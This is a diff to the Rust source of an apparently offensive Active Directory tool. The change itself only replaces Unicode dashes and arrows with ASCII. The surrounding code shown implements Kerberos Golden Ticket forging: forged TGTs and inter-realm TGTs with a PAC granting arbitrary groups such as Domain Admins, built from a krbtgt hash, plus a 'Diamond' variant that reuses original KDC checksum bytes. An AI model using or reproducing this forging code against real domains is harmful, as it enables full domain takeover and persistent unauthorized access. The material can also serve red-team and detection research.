@@ -1,4 +1,4 @@
-//! Golden Ticket forging — forge a TGT using the krbtgt hash.
+//! Golden Ticket forging -- forge a TGT using the krbtgt hash.
 //!
 //! Constructs a valid Kerberos TGT with a forged PAC containing
 //! arbitrary group memberships (Domain Admins, Enterprise Admins, etc.).
@@ -172,7 +172,7 @@ pub async fn forge_golden_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         }),
         persistence_result: None,
         message: format!(
-            "Golden Ticket forged: {} as {} ({}) — valid for {}h",
+            "Golden Ticket forged: {} as {} ({}) -- valid for {}h",
             realm, impersonate, etype_str, lifetime
         ),
     })
@@ -185,7 +185,7 @@ pub async fn forge_interrealm_tgt(
     target_domain: &str,
 ) -> Result<ForgeResult> {
     info!(
-        "[golden] Forging Inter-Realm TGT: {} → {}",
+        "[golden] Forging Inter-Realm TGT: {} -> {}",
         config.domain, target_domain
     );
 
@@ -292,11 +292,11 @@ pub async fn forge_interrealm_tgt(
     let etype_str = etype_name(etype);
 
     Ok(ForgeResult {
-        action: format!("Inter-Realm TGT → {}", target_realm),
+        action: format!("Inter-Realm TGT -> {}", target_realm),
         domain: config.domain.clone(),
         success: true,
         ticket_data: Some(ForgedTicket {
-            ticket_type: format!("Inter-Realm TGT ({} → {})", source_realm, target_realm),
+            ticket_type: format!("Inter-Realm TGT ({} -> {})", source_realm, target_realm),
             impersonated_user: impersonate.to_string(),
             domain: source_realm.clone(),
             spn: format!("krbtgt/{}", target_realm),
@@ -314,15 +314,15 @@ pub async fn forge_interrealm_tgt(
         }),
         persistence_result: None,
         message: format!(
-            "Inter-Realm TGT forged: {} → {} as {} ({})",
+            "Inter-Realm TGT forged: {} -> {} as {} ({})",
             source_realm, target_realm, impersonate, etype_str
         ),
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Internal Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Resolve key bytes and encryption type from hash string.
 fn resolve_key_and_etype(hash: &str, aes256: Option<&str>) -> Result<(Vec<u8>, i32)> {
@@ -370,7 +370,7 @@ pub(crate) fn generate_session_key(etype: i32) -> Vec<u8> {
 }
 
 /// Build PAC (Privilege Attribute Certificate) bytes.
-/// This is a simplified PAC — real PAC has KERB_VALIDATION_INFO, PAC_CLIENT_INFO,
+/// This is a simplified PAC -- real PAC has KERB_VALIDATION_INFO, PAC_CLIENT_INFO,
 /// server checksum, KDC checksum. We construct the minimal structure.
 #[allow(clippy::too_many_arguments)]
 pub(crate) fn build_pac(
@@ -413,8 +413,8 @@ pub(crate) fn build_pac(
 
     // Buffer 3: SERVER_CHECKSUM (type=6)
     // PAC_SIGNATURE_DATA = sig_type(4) + signature(N):
-    //   RC4-HMAC:   HMAC-MD5 = 16 bytes  → total 20
-    //   AES256/128: HMAC-SHA1-96 = 12 bytes → total 16
+    //   RC4-HMAC:   HMAC-MD5 = 16 bytes  -> total 20
+    //   AES256/128: HMAC-SHA1-96 = 12 bytes -> total 16
     let cksum_size: u32 = if etype == ETYPE_AES256_CTS || etype == 17 {
         4 + 12 // sig_type(4) + HMAC-SHA1-96(12)
     } else {
@@ -457,7 +457,7 @@ pub(crate) fn build_pac(
     //
     // compute_pac_checksum returns [sig_type(4) || signature(N)].
     let server_cksum = compute_pac_checksum(&pac, key, etype, true)?;
-    // Guard: cksum_size must match actual output length — mismatch means the PAC
+    // Guard: cksum_size must match actual output length -- mismatch means the PAC
     // header declared the wrong size and a copy would overwrite adjacent data.
     if server_cksum.len() != cksum_size as usize {
         return Err(OverthroneError::TicketForge(format!(
@@ -468,7 +468,7 @@ pub(crate) fn build_pac(
     pac[server_cksum_offset..server_cksum_offset + cksum_size as usize]
         .copy_from_slice(&server_cksum);
 
-    // KDC checksum — per [MS-PAC] §2.8.2 the KDC checksum is computed over
+    // KDC checksum -- per [MS-PAC] §2.8.2 the KDC checksum is computed over
     // only the *Signature* field of the server PAC_SIGNATURE_DATA structure,
     // NOT including the 4-byte SignatureType prefix.  Using the full
     // server_cksum (sig_type + signature) produces tickets that some KDC
@@ -497,7 +497,7 @@ fn build_kerb_validation_info(
 ) -> Vec<u8> {
     let mut buf = Vec::new();
 
-    // Logon time (Windows FILETIME — current time)
+    // Logon time (Windows FILETIME -- current time)
     let now_filetime = chrono_to_filetime(Utc::now());
     buf.extend_from_slice(&now_filetime.to_le_bytes()); // LogonTime
     buf.extend_from_slice(&0i64.to_le_bytes()); // LogoffTime (never)
@@ -520,7 +520,7 @@ fn build_kerb_validation_info(
     buf.extend_from_slice(&(uname_utf16.len() as u16).to_le_bytes());
     buf.extend_from_slice(&2u32.to_le_bytes());
 
-    // LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive — empty
+    // LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive -- empty
     for ptr in 3..=6u32 {
         buf.extend_from_slice(&0u16.to_le_bytes());
         buf.extend_from_slice(&0u16.to_le_bytes());
@@ -789,7 +789,7 @@ pub(crate) fn base64_encode(data: &[u8]) -> String {
 }
 
 /// Build a PAC with elevated privileges but inject the original KDC checksum bytes.
-/// This is the Enhanced Diamond technique — preserves whatever KDC_ISSUED indicators
+/// This is the Enhanced Diamond technique -- preserves whatever KDC_ISSUED indicators
 /// were in the original KDC-signed PAC.
 #[allow(clippy::too_many_arguments)]
 pub(crate) fn build_pac_with_kdc_checksum(
@@ -829,7 +829,7 @@ pub(crate) fn build_pac_with_kdc_checksum(
     pac.extend_from_slice(&(client_info.len() as u32).to_le_bytes());
     pac.extend_from_slice(&(client_offset as u64).to_le_bytes());
 
-    // Buffer 3: SERVER_CHECKSUM (type=6) — recomputed with krbtgt key
+    // Buffer 3: SERVER_CHECKSUM (type=6) -- recomputed with krbtgt key
     let cksum_size: u32 = if etype == ETYPE_AES256_CTS || etype == 17 {
         4 + 12
     } else {
@@ -840,7 +840,7 @@ pub(crate) fn build_pac_with_kdc_checksum(
     pac.extend_from_slice(&cksum_size.to_le_bytes());
     pac.extend_from_slice(&(server_cksum_offset as u64).to_le_bytes());
 
-    // Buffer 4: KDC_CHECKSUM (type=7) — use ORIGINAL bytes from legitimate PAC
+    // Buffer 4: KDC_CHECKSUM (type=7) -- use ORIGINAL bytes from legitimate PAC
     let kdc_cksum_offset = align_to_8(server_cksum_offset + cksum_size as usize);
     pac.extend_from_slice(&7u32.to_le_bytes());
     let actual_kdc_size = original_kdc_checksum.len() as u32;
